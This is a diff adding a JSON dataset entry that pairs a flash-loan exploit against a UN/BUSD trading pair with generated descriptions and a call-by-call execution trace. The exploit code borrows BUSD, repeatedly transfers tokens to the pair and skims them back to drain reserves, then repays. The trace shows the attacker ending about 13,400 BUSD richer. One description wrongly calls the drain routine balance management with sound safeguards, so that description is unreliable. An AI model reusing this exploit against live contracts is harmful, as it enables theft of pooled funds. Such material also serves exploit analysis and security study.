@@ -1,0 +1,478 @@
+[
+    {
+        "id": "551654",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Attacker BUSD balance before attack\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n\n        // End of preparation. Attack start\n        DPPOracle.flashLoan(0, 29_100 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSD balance after attack\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `testExploit` function is designed to simulate an attack scenario where a flash loan is taken from a specific oracle (`DPPOracle`). The function first logs the attacker's balance of a specific token (BUSD) before the attack. Then, it initiates the attack by calling the `flashLoan` function on the oracle, borrowing a large amount of tokens. After the attack, it logs the attacker's BUSD balance again to show the impact of the exploit.\n\n2. **Security mechanism:**  \n   The function itself does not include explicit security mechanisms. However, it relies on the underlying `flashLoan` function of the `DPPOracle` to handle the loan process. The use of `emit` statements for logging helps in tracking the state changes before and after the attack, which can be useful for debugging or analysis. The function is marked as `public`, meaning it can be called by anyone, which could be a security concern if not properly restricted in a real-world scenario.\n\n3. **Parameter Function:**  \n   The `flashLoan` function is called with four parameters:  \n   - `0`: This likely represents the amount of the first token to borrow (in this case, it seems to be zero).  \n   - `29_100 * 1e18`: This is the amount of the second token to borrow, which is 29,100 tokens with 18 decimal places (a common format for ERC-20 tokens).  \n   - `address(this)`: This specifies the address of the contract calling the flash loan, which is the attacker in this case.  \n   - `new bytes(1)`: This is a placeholder for additional data that might be required by the `flashLoan` function, though it is minimal here (a single byte).\n\n4. **Return description:**  \n   The function does not return any value directly. Instead, it uses `emit` statements to log the attacker's BUSD balance before and after the attack. The balance is retrieved using `BUSD.balanceOf(address(this))`, which checks the BUSD token balance of the contract (attacker) and formats it with the token's decimal places for readability. The output is purely informational and shows the effect of the flash loan attack on the attacker's balance.\n\n**In summary,**  \nThe `testExploit` function simulates a flash loan attack by borrowing a large amount of tokens from an oracle and logging the attacker's token balance before and after the attack. It relies on the `flashLoan` function to execute the attack and uses logging to track the impact. The function is public, which could pose a security risk if not properly managed.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2531",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10000000000000000 [1e16]"
+    },
+    {
+        "id": "2425",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "526077",
+        "args": "0, 29100000000000000000000 [2.91e22], AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10871",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29100000000000000000000 [2.91e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "488863",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 29100000000000000000000 [2.91e22], 0x00",
+        "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        (uint256 UNReserve, uint256 USDReserve,) = Pair.getReserves();\n        uint256 amountIn = BUSD.balanceOf(address(this));\n        uint256 amountOut = (9970 * amountIn * UNReserve) / (10_000 * USDReserve + 9970 * amountIn);\n        BUSD.transfer(address(Pair), amountIn);\n        Pair.swap(amountOut, 0, address(this), new bytes(0));\n\n        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 93 / 100);\n        Pair.skim(address(this));\n        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 90 / 100);\n        Pair.skim(address(this));\n        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 80 / 100);\n        Pair.skim(address(this));\n\n        (UNReserve, USDReserve,) = Pair.getReserves();\n        amountIn = UN.balanceOf(address(this));\n        amountOut = (9970 * amountIn * USDReserve) / (10_000 * UNReserve + 9970 * amountIn);\n        UN.transfer(address(Pair), amountIn);\n        Pair.swap(0, amountOut, address(this), new bytes(0));\n\n        BUSD.transfer(address(DPPOracle), 29_100 * 1e18);\n    }\n",
+        "description": "1. **Core functions:**  \n   This function is designed to perform a series of transactions involving two tokens (UN and BUSD) within a decentralized trading pair. It first calculates the amount of one token (BUSD) to be swapped for another (UN) based on the current reserves in the trading pair. After the swap, it transfers a portion of the UN tokens back to the trading pair in multiple steps, reducing the balance each time. Finally, it calculates another swap to convert the remaining UN tokens back to BUSD and transfers a fixed amount of BUSD to a specific address (DPPOracle). The function essentially automates a sequence of trades and transfers to manage token balances.\n\n2. **Security mechanism:**  \n   The function uses the `external` modifier, which restricts its access to external calls only, preventing internal misuse. It also relies on the `transfer` and `swap` functions of the trading pair, which are standard mechanisms for secure token transfers and swaps. Additionally, the function repeatedly calls `Pair.skim` to ensure the trading pair\u2019s reserves are updated correctly, reducing the risk of inconsistencies. However, the function does not include explicit checks for reentrancy attacks, which could be a potential vulnerability if the `transfer` or `swap` functions are not secure.\n\n3. **Parameter Function:**  \n   - `sender`: Represents the address initiating the function call, though it is not used within the function.  \n   - `baseAmount` and `quoteAmount`: These parameters specify the amounts of the two tokens involved in the flash loan, but they are also not directly used in the function\u2019s logic.  \n   - `data`: This parameter allows additional data to be passed into the function, but it is not utilized in the current implementation.  \n\n4. **Return description:**  \n   The function does not return any value. Instead, it performs a series of calculations and transactions to manage token balances. The key calculations involve determining the amount of tokens to swap (`amountOut`) based on the current reserves in the trading pair and the balance of tokens held by the contract. These calculations ensure that the swaps are executed proportionally to the available reserves, maintaining the integrity of the trading pair.  \n\n**In summary,**  \nThis function automates a sequence of token swaps and transfers within a decentralized trading pair, using calculations based on current reserves and balances. It includes basic security mechanisms but lacks explicit protections against reentrancy attacks. The function\u2019s parameters are not fully utilized, and it does not return any value, focusing instead on executing the specified transactions.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2517",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "186912581853851065964787 [1.869e23], 30265800773605712024588 [3.026e22], 1686054150 [1.686e9]"
+    },
+    {
+        "id": "531",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "29100010000000000000000 [2.91e22]"
+    },
+    {
+        "id": "8071",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 29100010000000000000000 [2.91e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "139752",
+        "args": "91480714664455701397200 [9.148e22], 0, AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "104336",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 91480714664455701397200 [9.148e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "25175",
+        "args": "2744421439933671041916 [2.744e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "623",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "95431867189395364567587 [9.543e22]"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59365810773605712024588 [5.936e22]"
+    },
+    {
+        "id": "623",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "85077064637943802299396 [8.507e22]"
+    },
+    {
+        "id": "57774",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 79121670113287736138438 [7.912e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "7804",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "623",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "64746200244138316171059 [6.474e22]"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59365810773605712024588 [5.936e22]"
+    },
+    {
+        "id": "4775",
+        "args": "2611015113738495292554 [2.611e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "31770",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "623",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "136351311696663717376387 [1.363e23]"
+    },
+    {
+        "id": "20336",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 71605111452525401205328 [7.16e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "4775",
+        "args": "2148153343575762036159 [2.148e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59365810773605712024588 [5.936e22]"
+    },
+    {
+        "id": "3271",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "623",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "72548148175504689281915 [7.254e22]"
+    },
+    {
+        "id": "44174",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 65293333357954220353723 [6.529e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "7804",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "623",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "40136134716614759403003 [4.013e22]"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59365810773605712024588 [5.936e22]"
+    },
+    {
+        "id": "4775",
+        "args": "2154680000812489271649 [2.154e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "31770",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "623",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "99226601405563328823191 [9.922e22]"
+    },
+    {
+        "id": "20336",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 59090466688948569420188 [5.909e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "4775",
+        "args": "1772714000668457082603 [1.772e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59365810773605712024588 [5.936e22]"
+    },
+    {
+        "id": "3271",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "623",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "62208948838272638488973 [6.22e22]"
+    },
+    {
+        "id": "44174",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 49767159070618110791178 [4.976e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "7804",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "623",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "21473109088836542984263 [2.147e22]"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59365810773605712024588 [5.936e22]"
+    },
+    {
+        "id": "4775",
+        "args": "1642316249330397656103 [1.642e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "31770",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "623",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "66512388047745933250296 [6.651e22]"
+    },
+    {
+        "id": "20336",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 45039278958909390266033 [4.503e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "4775",
+        "args": "1351178368767281707980 [1.351e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59365810773605712024588 [5.936e22]"
+    },
+    {
+        "id": "3271",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "517",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "21473109088836542984263 [2.147e22], 59365810773605712024588 [5.936e22], 1686054153 [1.686e9]"
+    },
+    {
+        "id": "623",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "54328319199440260645208 [5.432e22]"
+    },
+    {
+        "id": "44174",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 54328319199440260645208 [5.432e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "7804",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "623",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "689845789355713736750 [6.898e20]"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59365810773605712024588 [5.936e22]"
+    },
+    {
+        "id": "4775",
+        "args": "1792834533581528601285 [1.792e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "16815",
+        "args": "0, 42512363310180390856151 [4.251e22], AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3271",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 42512363310180390856151 [4.251e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "623",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "49856974664849149620683 [4.985e22]"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "16853447463425321168437 [1.685e22]"
+    },
+    {
+        "id": "3271",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], 29100000000000000000000 [2.91e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2534",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]",
+        "original_code": null,
+        "description": null,
+        "return_value": "74515087607638180967 [7.451e19]"
+    },
+    {
+        "id": "531",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]",
+        "original_code": null,
+        "description": null,
+        "return_value": "592676457339308279189968 [5.926e23]"
+    },
+    {
+        "id": "534",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]",
+        "original_code": null,
+        "description": null,
+        "return_value": "74515087607638180967 [7.451e19]"
+    },
+    {
+        "id": "531",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]",
+        "original_code": null,
+        "description": null,
+        "return_value": "592676457339308279189968 [5.926e23]"
+    },
+    {
+        "id": "531",
+        "args": "AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "13412363310180390856151 [1.341e22]"
+    },
+    {
+        "id": "425",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
